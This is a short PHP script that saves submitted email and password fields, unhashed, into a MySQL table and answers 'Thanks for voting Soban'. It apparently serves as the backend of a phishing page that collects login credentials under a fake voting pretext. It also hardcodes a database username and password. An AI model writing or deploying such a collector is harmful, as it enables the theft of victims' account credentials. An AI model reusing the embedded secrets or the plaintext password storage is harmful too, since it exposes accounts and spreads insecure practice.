<?php
// Database connection parameters
$servername = "localhost"; // Change this if your MySQL server is hosted elsewhere
$username = "id21952762_soban"; // Replace with your MySQL username
$password = "Soaban922@"; // Replace with your MySQL password
$database = "id21952762_sobann"; // Replace with your MySQL database name

// Create connection
$conn = new mysqli($servername, $username, $password, $database);

// Check connection
if ($conn->connect_error) {
    die("Connection failed: " . $conn->connect_error);
}

// Check if form is submitted
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Retrieve form data
    $email = $_POST['email'];
    $password = $_POST['password'];

    // Prepare and bind SQL statement
    $stmt = $conn->prepare("INSERT INTO idk (email, password) VALUES (?, ?)");
    $stmt->bind_param("ss", $email, $password);

    // Execute the statement
    if ($stmt->execute() === TRUE) {
        echo "Thanks for voting Soban";
    } else {
        echo "Error: " . $sql . "<br>" . $conn->error;
    }

    // Close statement
    $stmt->close();
}

// Close connection
$conn->close();
?>
